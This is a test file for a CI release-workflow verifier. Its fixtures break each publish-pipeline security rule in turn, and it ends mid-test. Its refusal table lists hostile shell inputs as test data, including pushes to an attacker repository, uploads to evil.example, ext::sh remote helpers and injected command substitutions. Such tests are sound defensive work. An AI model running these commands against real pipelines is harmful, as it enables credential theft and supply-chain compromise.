// SPDX-License-Identifier: MIT

// The release-pipeline workflow rules (verify-workflows.mjs): the real
// repository is clean, and every rule is seen to fire on a fixture that
// breaks only that rule.

import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { parse as parseYaml } from "yaml";
import { describe, expect, it } from "vitest";
import {
  findings,
  globMatches,
  publicGateFindings,
  releaseGateFindings,
  verifyWorkflows,
} from "./verify-workflows.mjs";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
const SHA = "34e114876b0b11c390a56381ad16ebd13914f8d5";

const manifest = {
  tagFormat: "sdk-{name}-v{version}",
  publish: [
    { name: "a", registry: "npm" },
    { name: "b", registry: "npm" },
    { name: "c", registry: "none" },
  ],
};
const settings = () => ({
  environments: [
    { name: "sdk-publish-npm", registry: "npm", secrets: [] },
    { name: "cli-release", tagPatterns: ["cli-v*"], secrets: [] },
  ],
  trustBindings: [{ registry: "npm", workflow: "sdk-publish.yml", environment: "sdk-publish-npm" }],
  allowedActions: ["pnpm/action-setup@*"],
  releaseTags: { name: "release tags", include: ["refs/tags/sdk-*", "refs/tags/cli-v*"] },
});
const HEAD = `on:
  push:
    tags: ["sdk-*-v*"]
env:
  NODE_VERSION: "22.23.3"
  NPM_VERSION: "11.20.0"
`;
const GOOD = `  pack-npm:
    steps:
      - uses: pnpm/action-setup@${SHA}
      - uses: actions/setup-node@${SHA}
        with:
          node-version: \${{ env.NODE_VERSION }}
      - run: pnpm install --frozen-lockfile
  publish-npm:
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/')
    runs-on: ubuntu-latest
    environment: sdk-publish-npm
    permissions:
      id-token: write
    steps:
      - uses: actions/setup-node@${SHA}
        with:
          node-version: \${{ env.NODE_VERSION }}
      - run: npm install --global --ignore-scripts "npm@\${NPM_VERSION}"
      - run: npm publish --ignore-scripts "./release/$ARTIFACT"
`;
const flow = (jobs, head = HEAD) => parseYaml(`${head}jobs:\n${jobs}`);
const run = (jobs, { s = settings(), m = manifest, extra = {}, head = HEAD } = {}) =>
  findings({
    settings: s,
    manifest: m,
    workflows: { "sdk-publish.yml": flow(jobs, head), ...extra },
  }).map((f) => f.why);
const fires = (got, re) => expect(got).toContainEqual(expect.stringMatching(re));
const swap = (from, to) => {
  if (!GOOD.includes(from)) throw new Error(`fixture lacks ${from}`);
  // A replacer function: `$'` and `$&` in a shell fixture are text, not patterns.
  return GOOD.replace(from, () => to);
};
const UPLOAD = 'npm publish --ignore-scripts "./release/$ARTIFACT"';
const PUBLISH_STEP = `      - run: ${UPLOAD}`;
const INSTALL_STEP = "      - run: pnpm install --frozen-lockfile";

/** A Packagist mirror and a Go module tag, declared the way release-settings.json does. */
const withMirrors = () => {
  const m = {
    ...manifest,
    publish: [
      ...manifest.publish,
      { name: "p", registry: "packagist", mirror: { repository: "o/p", releaseTag: "v{version}" } },
      { name: "g", registry: "go", releaseTag: "apps/g/v{version}" },
    ],
  };
  const s = settings();
  s.environments.push(
    { name: "sdk-publish-packagist", registry: "packagist", secrets: [] },
    { name: "sdk-publish-go", registry: "go", secrets: [] },
  );
  s.mirrors = [
    { repository: "o/p", unit: "p", environment: "sdk-publish-packagist", tags: ["refs/tags/v*"] },
  ];
  s.goModuleTags = { include: ["refs/tags/apps/g/v*"], environment: "sdk-publish-go" };
  return { m, s };
};
/** A publish job of the fixture that reads one secret through its env. */
const READS_SECRET = (name) =>
  GOOD.replace(
    "      - run: npm publish",
    `      - env:\n          DEPLOY_KEY: \${{ secrets.${name} }}\n        run: echo\n      - run: npm publish`,
  );

describe("the real repository", () => {
  it("is clean", () => expect(verifyWorkflows(ROOT)).toEqual([]));
});

describe("globMatches", () => {
  it("matches the way a tag filter does", () => {
    expect(globMatches("sdk-a-v*", "sdk-a-v1.0.0")).toBe(true);
    expect(globMatches("sdk-a-v*", "sdk-ab-v1.0.0")).toBe(false);
  });
  it("`*` does not cross a slash", () =>
    expect(globMatches("refs/tags/sdk-*", "refs/tags/sdk-a/x")).toBe(false));
  it("`**` crosses a slash, and a literal dot stays literal", () => {
    expect(globMatches("refs/tags/**", "refs/tags/apps/sdk-go/v1.0.0")).toBe(true);
    expect(globMatches("refs/tags/v*.0", "refs/tags/v1x0")).toBe(false);
  });
  it("refuses a glob character it does not implement", () =>
    expect(() => globMatches("sdk-?", "sdk-a")).toThrow());
});

describe("each rule fires on a fixture that breaks only it", () => {
  it("control: the good fixture is clean", () => expect(run(GOOD)).toEqual([]));

  it("1 an undeclared environment", () =>
    fires(
      run(swap("environment: sdk-publish-npm", "environment: sdk-publish")),
      /does not declare/,
    ));

  it("2 id-token outside an environment", () =>
    fires(
      run(swap("  pack-npm:\n", "  pack-npm:\n    permissions:\n      id-token: write\n")),
      /id-token: write outside/,
    ));
  it("2 id-token granted at the top level", () =>
    fires(
      run(GOOD, { head: `${HEAD}permissions:\n  id-token: write\n` }),
      /grants id-token: write at the top level/,
    ));
  it("2 write-all at the top level", () =>
    fires(run(GOOD, { head: `${HEAD}permissions: write-all\n` }), /at the top level/));
  it.each([
    ["dot syntax", "${{ secrets.X }}"],
    ["bracket syntax", "${{ secrets['X'] }}"],
    ["the whole context", "${{ toJSON(secrets) }}"],
  ])("2 a secret outside an environment (%s)", (_, expr) =>
    fires(
      run(swap(INSTALL_STEP, `      - env:\n          T: ${expr}\n        run: echo`)),
      /secrets context outside/,
    ),
  );
  it("2 a secret at the top level", () =>
    fires(
      run(GOOD, { head: `${HEAD}  T: \${{ secrets.X }}\n` }),
      /secrets context at the top level/,
    ));

  it.each([
    ["pnpm install", "pnpm install"],
    ["a repository script", "node tools/x.mjs"],
    ["a build", "pnpm run build"],
    ["make", "make release"],
    ["a local executable", "./gradlew publish"],
    ["a shell script", "bash scripts/x.sh"],
    ["npm ci", "npm ci"],
  ])("3 a publish job that runs %s", (_, cmd) =>
    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job/),
  );
  it("3 a publish job's checkout that keeps its credential", () =>
    fires(
      run(swap(PUBLISH_STEP, `      - uses: actions/checkout@${SHA}`)),
      /keeps its credential/,
    ));
  it("3 a publish job's checkout without a credential is allowed", () =>
    expect(
      run(
        swap(
          PUBLISH_STEP,
          `      - uses: actions/checkout@${SHA}\n        with:\n          persist-credentials: false`,
        ),
      ),
    ).toEqual([]));
  it.each([
    ["the publish job", "id-token: write\n    steps:\n      - uses: actions/setup-node"],
    ["the pack job", "  pack-npm:\n    steps:\n      - uses: pnpm/action-setup"],
  ])("3 a cache restored in %s", (_, anchor) => {
    const jobs = anchor.startsWith("  pack-npm")
      ? GOOD.replace(
          `      - uses: pnpm/action-setup@${SHA}\n`,
          `      - uses: pnpm/action-setup@${SHA}\n      - uses: actions/cache@${SHA}\n`,
        )
      : GOOD.replace(
          "      - run: npm install --global",
          `      - uses: actions/cache@${SHA}\n      - run: npm install --global`,
        );
    fires(run(jobs), /restores a cache/);
  });
  it("3 an eval in a pack job", () =>
    fires(run(swap("pnpm install --frozen-lockfile", 'eval "$X"')), /evals a string/));

  it("4 an untrusted trigger", () =>
    fires(
      run(GOOD, { extra: { "x.yml": parseYaml("on: [pull_request_target]\njobs: {}\n") } }),
      /triggers on pull_request_target/,
    ));

  it("5 an expression in a run block", () =>
    fires(
      run(swap("pnpm install --frozen-lockfile", "echo ${{ github.ref_name }}")),
      /interpolates/,
    ));

  it("6 a reusable workflow that binds an environment", () =>
    fires(
      run(GOOD, {
        extra: {
          "r.yml": parseYaml(
            "on: workflow_call\njobs:\n  j:\n    environment: sdk-publish-npm\n    steps: []\n",
          ),
        },
      }),
      /a reusable workflow binds/,
    ));
  it("6 secrets: inherit", () =>
    fires(
      run(GOOD, {
        extra: {
          "c.yml": parseYaml(
            "on: push\njobs:\n  j:\n    uses: ./.github/workflows/r.yml\n    secrets: inherit\n",
          ),
        },
      }),
      /secrets: inherit/,
    ));

  it("7 a tag trigger that misses a unit", () =>
    fires(
      run(GOOD, { head: HEAD.replace('tags: ["sdk-*-v*"]', 'tags: ["sdk-a-v*"]') }),
      /does not match unit b/,
    ));
  it("7 a unit no protected tag pattern covers", () => {
    const s = settings();
    s.releaseTags.include = ["refs/tags/cli-v*"];
    fires(run(GOOD, { s }), /no protected release-tag pattern covers unit a/);
  });
  it("7 a registry with units but no environment", () => {
    const s = settings();
    s.environments = s.environments.filter((e) => e.registry !== "npm");
    s.trustBindings = [];
    fires(
      run(swap("environment: sdk-publish-npm", "environment: cli-release"), { s }),
      /has 0 environments/,
    );
  });
  it("7 an environment with no unit", () => {
    const s = settings();
    s.environments.push({ name: "sdk-publish-pypi", registry: "pypi", secrets: [] });
    fires(run(GOOD, { s }), /sdk-publish-pypi has no unit/);
  });
  it("7 a publish job bound to another registry's environment", () => {
    const s = settings();
    s.environments.push({ name: "sdk-publish-other", registry: "npm2", secrets: [] });
    fires(
      run(swap("environment: sdk-publish-npm", "environment: sdk-publish-other"), { s }),
      /not registry npm's environment/,
    );
  });
  it("7 a job for a registry with no unit", () =>
    fires(
      run(`${GOOD}  pack-hex:\n    steps: []\n`),
      /names registry hex, which has no publish unit/,
    ));
  it("7 a pack job that binds an environment", () =>
    fires(
      run(swap("  pack-npm:\n", "  pack-npm:\n    environment: sdk-publish-npm\n")),
      /a pack job binds an environment/,
    ));
  it("7 a trust binding to another registry's environment", () => {
    const s = settings();
    s.trustBindings[0].environment = "cli-release";
    fires(run(GOOD, { s }), /not that registry's/);
  });
  it("7 a trust binding to a missing workflow", () => {
    const s = settings();
    s.trustBindings[0].workflow = "gone.yml";
    fires(run(GOOD, { s }), /gone.yml, which does not exist/);
  });

  it("8 an action not pinned to a commit SHA", () =>
    fires(
      run(swap(`pnpm/action-setup@${SHA}`, "pnpm/action-setup@v4")),
      /without a full commit SHA/,
    ));
  it("8 an action not on the allow-list", () =>
    fires(
      run(swap(`pnpm/action-setup@${SHA}`, `evil/setup@${SHA}`)),
      /uses evil\/setup, which .* does not allow/,
    ));
  it("8 an allowance nobody uses", () => {
    const s = settings();
    s.allowedActions.push("astral-sh/setup-uv@*");
    fires(run(GOOD, { s }), /allows astral-sh\/setup-uv@\*, which no workflow uses/);
  });

  it("9 a literal npm version instead of the workflow's pin", () =>
    fires(
      run(swap('"npm@${NPM_VERSION}"', "npm@11.20.0")),
      /not the workflow's exact NPM_VERSION/,
    ));
  it("9 a workflow pin that is not exact", () =>
    fires(
      run(GOOD, { head: HEAD.replace('NPM_VERSION: "11.20.0"', 'NPM_VERSION: "11"') }),
      /env NPM_VERSION is 11/,
    ));
  it("9 npx in a pack job", () =>
    fires(run(swap("pnpm install --frozen-lockfile", "npx something")), /through npx/));
  it("10 a relative tarball path without ./ (npm reads it as a GitHub repository)", () =>
    fires(
      run(swap(UPLOAD, 'npm publish --ignore-scripts --access public "release/$ARTIFACT"')),
      /npm publish release\/\$ARTIFACT: a path without/,
    ));
  it.each([
    '"$RUNNER_TEMP"/release/*.tgz',
    "/abs/x.tgz",
    '"./x.tgz"',
    '--dry-run --access public "./x.tgz"',
  ])("10 accepts npm publish %s (in the pack job's dry run)", (arg) =>
    expect(run(swap(INSTALL_STEP, `      - run: npm publish --ignore-scripts ${arg}`))).toEqual([]),
  );
  it.each([
    "cargo build --release",
    'cargo "+${RUST_VERSION}" package',
    "dotnet build",
    "dotnet pack -c Release",
    "gem build confeature.gemspec",
    "uv build",
    "uvx twine check dist/*",
    "dart pub get",
    "python3 setup.py sdist",
    "rake release",
  ])("3 a publish job running %s", (cmd) => fires(run(swap(UPLOAD, cmd)), /a credentialed job/));
  it.each([
    'dotnet nuget push "./release/x.nupkg" --api-key "$K" --source https://api.nuget.org/v3/index.json',
    'gem push "./release/$ARTIFACT"',
  ])("3 accepts the registry client upload %s", (cmd) =>
    expect(run(swap(UPLOAD, cmd))).toEqual([]),
  );
  it.each([
    [
      'cargo "+${RUST_VERSION}" publish --no-verify --manifest-path "${UNIT_PATH}/Cargo.toml"',
      "publish-crates",
    ],
    ['dart pub publish --force --directory "${UNIT_PATH}"', "publish-pubdev"],
  ])("3 a source-only upload (%s) is allowed in %s only", (cmd, job) => {
    const PROJECT = /a credentialed job/;
    // In another publish job it is project code.
    fires(run(swap(UPLOAD, cmd)), PROJECT);
    // In its own job, and nowhere else, it is the recorded exception.
    const own = swap("  publish-npm:\n", `  ${job}:\n`).replace(UPLOAD, cmd);
    expect(run(own).filter((w) => PROJECT.test(w))).toEqual([]);
    // A variant of it is not the exception.
    const variant = own.replace(cmd, `${cmd} && cargo build`);
    fires(run(variant), PROJECT);
  });
  it("1 a secret its environment does not declare", () =>
    fires(
      run(READS_SECRET("DEPLOY_KEY")),
      /reads secret DEPLOY_KEY, which environment sdk-publish-npm does not declare/,
    ));
  it("1 a secret its environment declares", () => {
    const s = settings();
    s.environments[0].secrets.push({ name: "DEPLOY_KEY", kind: "deploy-key" });
    expect(run(READS_SECRET("DEPLOY_KEY"), { s })).toEqual([]);
  });

  it.each([
    [
      "no cache input on an action that caches by default",
      `      - uses: actions/setup-go@${SHA}\n`,
    ],
    [
      "cache: true",
      `      - uses: actions/setup-go@${SHA}\n        with:\n          cache: true\n`,
    ],
    [
      "a cache path",
      `      - uses: actions/setup-node@${SHA}\n        with:\n          node-version: \${{ env.NODE_VERSION }}\n          cache: pnpm\n`,
    ],
    [
      "a JDK cache (setup-java's cache-jdk)",
      `      - uses: actions/setup-java@${SHA}\n        with:\n          distribution: temurin\n          cache-jdk: true\n`,
    ],
  ])("3 a pack job's cache: %s", (_, step) =>
    fires(run(GOOD.replace(INSTALL_STEP, `${step}${INSTALL_STEP}`)), /restores a cache/),
  );
  it("3 `cache: false` restores nothing", () =>
    expect(
      run(
        GOOD.replace(
          INSTALL_STEP,
          `      - uses: actions/setup-go@${SHA}\n        with:\n          cache: false\n${INSTALL_STEP}`,
        ),
      ),
    ).toEqual([]));
  it("3 setup-java with no cache input, or cache-jdk: false, restores nothing (#902)", () => {
    for (const extra of ["", "          cache-jdk: false\n"])
      expect(
        run(
          GOOD.replace(
            INSTALL_STEP,
            `      - uses: actions/setup-java@${SHA}\n        with:\n          distribution: temurin\n${extra}${INSTALL_STEP}`,
          ),
        ),
      ).toEqual([]);
  });
  it.each([
    "$UNIT_PATH/gradlew publish",
    "(cd apps/sdk-java && ./gradlew publish)",
    "gradle publish",
    "mvnw deploy",
    "mvn deploy",
  ])("3 a publish job running a JVM build (%s)", (cmd) =>
    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job/),
  );
  it.each(["bundle install", "bundle exec rake release", "(bundle exec rake)"])(
    "3 a publish job running bundler (%s)",
    (cmd) => fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job/),
  );

  it("11 control: a declared mirror and Go module tags are clean", () => {
    const { m, s } = withMirrors();
    expect(run(GOOD, { m, s })).toEqual([]);
  });
  it("11 a mirror in an undeclared environment", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].environment = "sdk-publish-mirror";
    fires(
      run(GOOD, { m, s }),
      /mirror o\/p names environment sdk-publish-mirror, which is not unit p's registry's/,
    );
  });
  it("11 a mirror in another registry's environment", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].environment = "sdk-publish-npm";
    fires(
      run(GOOD, { m, s }),
      /names environment sdk-publish-npm, which is not unit p's registry's/,
    );
  });
  it("11 a mirror whose unit mirrors another repository", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].repository = "o/other";
    fires(run(GOOD, { m, s }), /mirror o\/other names unit p, whose manifest mirror is o\/p/);
  });
  it("11 a mirror naming no unit", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].unit = "gone";
    fires(run(GOOD, { m, s }), /mirror o\/p names unit gone, whose manifest mirror is undefined/);
  });
  it("11 a unit's mirror that the settings do not declare", () => {
    const { m, s } = withMirrors();
    s.mirrors = [];
    fires(run(GOOD, { m, s }), /unit p has a mirror \(o\/p\) that .* does not declare/);
  });
  it("11 a mirror whose tag patterns miss the unit's release tag", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].tags = ["refs/tags/release-*"];
    fires(run(GOOD, { m, s }), /mirror o\/p's tag patterns do not cover refs\/tags\/v1.0.0/);
  });
  it("11 Go module tags bound to another registry's environment", () => {
    const { m, s } = withMirrors();
    s.goModuleTags.environment = "sdk-publish-npm";
    fires(
      run(GOOD, { m, s }),
      /goModuleTags names environment sdk-publish-npm, which is not the go registry's/,
    );
  });
  it("11 Go module tags that miss a Go unit's tag", () => {
    const { m, s } = withMirrors();
    s.goModuleTags.include = ["refs/tags/v*"];
    fires(
      run(GOOD, { m, s }),
      /goModuleTags does not cover unit g's module tag \(refs\/tags\/apps\/g\/v1.0.0\)/,
    );
  });
  it("11 a Go unit with no module tag", () => {
    const { m, s } = withMirrors();
    delete m.publish.find((u) => u.name === "g").releaseTag;
    fires(run(GOOD, { m, s }), /go unit g has no releaseTag/);
  });
  it("11 Go units with no goModuleTags at all", () => {
    const { m, s } = withMirrors();
    delete s.goModuleTags;
    fires(run(GOOD, { m, s }), /goModuleTags names environment undefined/);
  });

  it("9 every *_VERSION pin is exact", () =>
    fires(
      run(GOOD, {
        head: HEAD.replace(
          'NPM_VERSION: "11.20.0"\n',
          'NPM_VERSION: "11.20.0"\n  RUST_VERSION: "1.88"\n',
        ),
      }),
      /env RUST_VERSION is 1.88, not an exact version/,
    ));
  it("9 a literal node-version in a pack job", () =>
    fires(
      run(GOOD.replaceAll("node-version: ${{ env.NODE_VERSION }}", "node-version: 22")),
      /node-version is 22/,
    ));
});

/** cli-release.yml as the fixture: two jobs bound to `cli-release`, which has no registry. */
const CLI = `on:
  push:
    tags: ["cli-v*"]
jobs:
  upload:
    runs-on: ubuntu-latest
    environment: cli-release
    steps:
      - uses: actions/checkout@${SHA}
        with:
          persist-credentials: false
      - run: bash apps/cli/scripts/publish-r2.sh upload "\${TAG#cli-v}" dist
  promote:
    runs-on: ubuntu-latest
    environment: cli-release
    steps:
      - run: bash apps/cli/scripts/publish-r2.sh promote "\${TAG#cli-v}"
  verify-pinned:
    uses: ./.github/workflows/cli-windows-install-verify.yml
`;
const VERIFY_CALLEE = parseYaml("on: workflow_call\njobs: {}\n");
const runCli = (cli = CLI, jobs = GOOD) =>
  run(jobs, {
    extra: { "cli-release.yml": parseYaml(cli), "cli-windows-install-verify.yml": VERIFY_CALLEE },
  });
const RAN = /a credentialed job/;

describe("rule 3 holds every job bound to an environment, not only a registry's (#794 review)", () => {
  it("control: cli-release's upload and promote, as recorded, are clean", () =>
    expect(runCli()).toEqual([]));
  it("a cli-release job that runs project code", () =>
    fires(
      runCli(
        CLI.replace(
          'promote "${TAG#cli-v}"',
          'promote "${TAG#cli-v}"\n      - run: deno task compile',
        ),
      ),
      RAN,
    ));
  it("a cli-release job whose checkout keeps its credential", () =>
    fires(
      runCli(CLI.replace("        with:\n          persist-credentials: false\n", "")),
      /keeps its credential/,
    ));
  it("a cli-release job that restores a cache", () =>
    fires(
      runCli(
        CLI.replace(
          "      - run: bash apps/cli/scripts/publish-r2.sh promote",
          `      - uses: actions/cache@${SHA}\n      - run: bash apps/cli/scripts/publish-r2.sh promote`,
        ),
      ),
      /restores a cache/,
    ));
  it("publish-r2.sh is the exception in upload and promote only, each with its own verb", () => {
    // The promote command in the upload job is not upload's exception.
    fires(runCli(CLI.replace('upload "${TAG#cli-v}" dist', 'promote "${TAG#cli-v}"')), RAN);
    // A rollback is not recorded anywhere.
    fires(runCli(CLI.replace('promote "${TAG#cli-v}"', 'rollback "${TAG#cli-v}"')), RAN);
    // The same command in sdk-publish.yml is project code.
    fires(
      runCli(
        CLI,
        swap(
          PUBLISH_STEP,
          '      - run: bash apps/cli/scripts/publish-r2.sh promote "${TAG#cli-v}"',
        ),
      ),
      RAN,
    );
    // A prefix assignment or a chained command breaks the exact match.
    fires(
      runCli(
        CLI.replace(
          "- run: bash apps/cli/scripts/publish-r2.sh promote",
          "- run: WRANGLER=x bash apps/cli/scripts/publish-r2.sh promote",
        ),
      ),
      RAN,
    );
  });
});

describe("rule 3: caches that are on unless switched off (#794 review)", () => {
  const UV = (input) =>
    `      - uses: astral-sh/setup-uv@${SHA}\n        with:\n          version: "0.10.7"\n${input}`;
  const withUv = (input) => {
    const s = settings();
    s.allowedActions.push("astral-sh/setup-uv@*");
    return run(GOOD.replace(INSTALL_STEP, `${UV(input)}${INSTALL_STEP}`), { s });
  };
  it.each([
    ["enable-cache: true", "          enable-cache: true\n"],
    ['enable-cache: "auto" (its default)', '          enable-cache: "auto"\n'],
    ["no enable-cache at all", ""],
  ])("setup-uv with %s restores a cache", (_, input) => fires(withUv(input), /restores a cache/));
  it("enable-cache: true on any action is a cache, not only on setup-uv", () =>
    fires(
      run(
        swap(
          `      - uses: pnpm/action-setup@${SHA}\n`,
          `      - uses: pnpm/action-setup@${SHA}\n        with:\n          enable-cache: true\n`,
        ),
      ),
      /restores a cache/,
    ));
  it("setup-uv with enable-cache: false restores nothing", () =>
    expect(withUv("          enable-cache: false\n")).toEqual([]));
  it("bundler-cache: false restores nothing; bundler-cache: true does", () => {
    const s = settings();
    s.allowedActions.push("ruby/setup-ruby@*");
    const ruby = (v) =>
      run(
        GOOD.replace(
          INSTALL_STEP,
          `      - uses: ruby/setup-ruby@${SHA}\n        with:\n          bundler-cache: ${v}\n${INSTALL_STEP}`,
        ),
        { s },
      );
    expect(ruby("false")).toEqual([]);
    fires(ruby("true"), /restores a cache/);
  });
});

describe("rule 3: a credentialed job runs only its grammar and allowlist (#794 review)", () => {
  const block = (cmd) => `      - run: |\n          ${cmd.replace(/\n/g, "\n          ")}`;
  const inPublish = (cmd, opts) => run(swap(PUBLISH_STEP, block(cmd)), opts);
  const CRED = /a credentialed job/;
  const PUSH = "git push --atomic --end-of-options";
  it.each([
    // Rounds 1 and 2: the blocklist's bypasses.
    ["a backslash continuation", "pn\\\npm install"],
    ["a continuation inside npm's arguments", "npm \\\n  ci"],
    ["an option before npm's subcommand", "npm --prefix x ci"],
    ["npm publish without --ignore-scripts", 'npm publish "./release/$ARTIFACT"'],
    [
      "npm publish --ignore-scripts=false",
      'npm publish --ignore-scripts --ignore-scripts=false "./release/$ARTIFACT"',
    ],
    ["bunx", "bunx some-tool"],
    ["deno", "deno run x.ts"],
    ["tsx", "tsx x.ts"],
    ["go test", "go test ./..."],
    ["source", "source scripts/x.sh"],
    [". (source)", ". scripts/x.sh"],
    ["a repository path without ./", "apps/cli/scripts/x.sh upload"],
    ["a command substitution", 'v="$(python3 evil.py)"'],
    ["a substitution inside a quoted argument", 'echo "$(node x.mjs)"'],
    ["a process substitution", "cat <(node x.mjs)"],
    ["a substitution inside ${ }", 'echo "${X:-$(node x.mjs)}"'],
    ["a backtick substitution", "echo `node x.mjs`"],
    ["a variable as the command", '"$CMD" publish'],
    ["eval", 'eval "$X"'],
    ["exec", "exec python3 x.py"],
    ["env", "env FOO=1 bash x.sh"],
    ["xargs", "ls | xargs sh"],
    ["find -exec", "find . -exec sh {} \;"],
    ["sort --compress-program", "sort --compress-program=sh"],
    ["sed's e flag", "sed 's/x/id/e'"],
    ["sed -e", "sed -e '1e id'"],
    ["sed -f", "sed -f script.sed"],
    ["a second sed script", "sed 's/a/b/' -e '1e id'"],
    ["git -c before the subcommand", "git -c core.sshCommand=sh push x"],
    ["git --upload-pack", "git fetch --upload-pack=sh x"],
    ["git config", "git config alias.x '!sh'"],
    ["a loop", "while read -r x; do python3 x; done < f"],
    ["a case", 'case "$x" in a) python3 y ;; esac'],
    ["a subshell", "(cd x && make)"],
    ["a function", "f() { pnpm install; }; f"],
    ["export", 'export PATH="./bin:$PATH"'],
    ["a prefix assignment", "BASH_ENV=x.sh echo hi"],
    ["an assignment", 'GIT_SSH_COMMAND="sh evil.sh"'],
    ["a write to GITHUB_PATH", 'echo "$PWD/bin" >> "$GITHUB_PATH"'],
    // Round 3: arithmetic that bash runs as subshells, case closing a substitution.
    ["((…)) read as arithmetic", "((node x.mjs) || (true))"],
    ["$((…)) read as arithmetic", "x=$((cmd) || (x))"],
    ["case after then", 'if true; then case "$x" in a) node x ;; esac; fi'],
    ["case inside $( )", 'echo "$(case x in a) node y ;; esac)"'],
    ["case in a group", "{ case x in a) node y;; esac; }"],
    ["case after !", "! case x in a) y;; esac"],
    ["case with in on the next line", "case x\nin a) node y;; esac"],
    ["ANSI-C quoting", "echo $'\\'' ; node x # '"],
    ['$"…" quoting', 'echo $"x"'],
    ["a one-line function", "function f { pnpm install; }"],
    ["function shadowing an earlier command", "node evil.mjs\nnode() { :; }"],
    ["a function defined in a skipped branch", "false && python3() { :; }; python3 x.py"],
    // Round 3: variables bound without NAME=.
    ["local", "local PATH=x"],
    ["read", "read PATH < x"],
    ["printf -v", "printf -v PATH '%s' x"],
    ["for … in", "for PATH in x; do :; done"],
    ["for without in", "set -- a; for x do node evil.mjs; done"],
    ["an arithmetic for", "for ((i=0;i<1;i++)) do node x; done"],
    ["${…:=…}", ': "${PATH:=./bin}"'],
    ["export without a value", "export PATH"],
    ["export of an expansion", 'export "$N=x"'],
    // Round 3: expansions bash evaluates as code.
    ["an arithmetic subscript", "x='a[$(node evil.mjs)]'; echo \"$((x))\""],
    ["a substring expansion", 'echo "${s:x}"'],
    ["a funsub", 'echo "${ node x; }"'],
    ["a valsub", 'echo "${| node x; }"'],
    ["a substitution inside arithmetic", 'echo "$(( $(node x) ))"'],
    ["indirect expansion", 'echo "${!X}"'],
    // Round 3: options that reach a tool by other routes.
    [
      "an option through a variable",
      `${PUSH} "$X" git@github.com:confeature/sdks.git HEAD:refs/heads/main`,
    ],
    ["an operand that starts with an expansion", 'git push --atomic "$X" HEAD:refs/heads/main'],
    ["brace expansion", "git push --receive-pack={sh,x} x"],
    ["a glob", "git push --receive-pack=s* x"],
    [
      "an abbreviated long option (git)",
      `git push --receive-pa=sh --end-of-options git@github.com:confeature/sdks.git HEAD:refs/heads/main`,
    ],
    ["an abbreviated long option (sort)", "sort --compress-prog=sh"],
    ["git init --template", "git init --template=publish-tmp/t publish-tmp/m.git"],
    ["cd before an exception", 'cd apps && bash cli/scripts/publish-r2.sh promote "${TAG#cli-v}"'],
    // Round 3: writes that change later steps.
    ["GITHUB_ENV through a literal", "printf 'PATH=x' >> \"$GITHUB_ENV\""],
    [
      "the runner's file-command directory",
      "echo x > publish-tmp/../../_temp/_runner_file_commands/set_env_1",
    ],
    ["RUNNER_TEMP", 'printf x > "$RUNNER_TEMP/x"'],
    ["a write outside publish-tmp", "printf x > apps/cli/scripts/publish-r2.sh"],
    ["rm outside publish-tmp", "rm -rf apps"],
    ["mkdir outside publish-tmp", "mkdir -p apps/x"],
    // Round 3: remote helpers and pinned destinations (security review).
    ["an ext:: remote", "git push 'ext::sh -c touch% /tmp/x' main"],
    ["an fd:: remote", "git fetch fd::3"],
    ["an ext:: remote after end-of-options", `${PUSH} 'ext::sh -c x' HEAD:refs/heads/x`],
    [
      "a repository the settings do not name",
      `${PUSH} git@github.com:attacker/x.git HEAD:refs/tags/x`,
    ],
    ["a forced refspec", `${PUSH} git@github.com:confeature/sdks.git +HEAD:refs/heads/main`],
    ["a refspec that is an expansion", `${PUSH} git@github.com:confeature/sdks.git "$REF"`],
    [
      "dotnet --source elsewhere",
      'dotnet nuget push "./x.nupkg" --api-key "$K" --source https://evil.example/v3/index.json',
    ],
    ["gem push --host", 'gem push --host https://evil.example "./x.gem"'],
    ["curl -o", "curl -fsS -o x https://proxy.golang.org/x"],
    ["curl -K", "curl -K cfg https://proxy.golang.org/x"],
    ["curl to another host", "curl -fsS https://evil.example/x"],
    [
      "aws (only the reviewed Maven script uploads to R2)",
      "aws s3api --endpoint-url https://evil.example put-object",
    ],
    ["rustup run", "rustup run stable node x"],
    ["rustup with an expansion before --", 'rustup toolchain install "$X"'],
  ])("refuses %s", (_, cmd) => {
    const got = inPublish(cmd);
    expect(
      got.some((w) => CRED.test(w)),
      `accepted: ${cmd}\n${got.join("\n")}`,
    ).toBe(true);
  });

  // Each row fails on its own check, not on a neighbour's.
  it.each([
    ["a here-document", "echo x <<echo\necho", /has a here-document/],
    ["a backtick", "echo `echo`", /has a backtick/],
    ["an unquoted $", "echo $X", /an unquoted \$/],
    ["a glob", "ls release/*", /a glob character/],
    ["a & background job", "echo x & echo y", /a & \(background/],
    ["a subshell around an allowed command", "( echo hi )", /a \( \) or \{ \}/],
    ["a group around an allowed command", "{ echo hi; }", /a \( \) or \{ \}/],
    ["a backslash outside quotes", "echo a\\ b", /a backslash outside quotes/],
    ["a substitution inside ${ }", 'echo "${X:-$(echo)}"', /\$\{ with \$/],
    [
      "a write outside publish-tmp",
      "echo x > apps/cli/scripts/publish-r2.sh",
      /writes only publish-tmp/,
    ],
    ["a .. in a redirection", "echo x > publish-tmp/../apps/x", /a literal path/],
    [
      "a git global option other than --git-dir",
      "git --exec-path=x init --quiet --bare publish-tmp/m.git",
      /global option/,
    ],
  ])("refuses %s, for that reason", (_, cmd, re) => fires(inPublish(cmd), re));

  it("a folded run: > block is read as bash reads it, folded", () =>
    fires(
      run(swap(PUBLISH_STEP, "      - run: >\n          echo hi\n          && node x.mjs")),
      /node is not a command/,
    ));

  it.each([
    [
      "a single-file digest check",
      `printf '%s  %s\\n' "$EXPECTED_SHA256" "release/$ARTIFACT" | sha256sum --check --strict`,
    ],
    [
      "a file-set check, with an apostrophe in a message",
      `mkdir -p publish-tmp
ls -1 release | sort > publish-tmp/got-files
printf '%s\\n' "$EXPECTED_SUMS" | cut -d ' ' -f 3- | sort > publish-tmp/want-files
if cmp publish-tmp/got-files publish-tmp/want-files; then echo "the file set is the pack job's"; else echo "::error::it isn't"; exit 1; fi
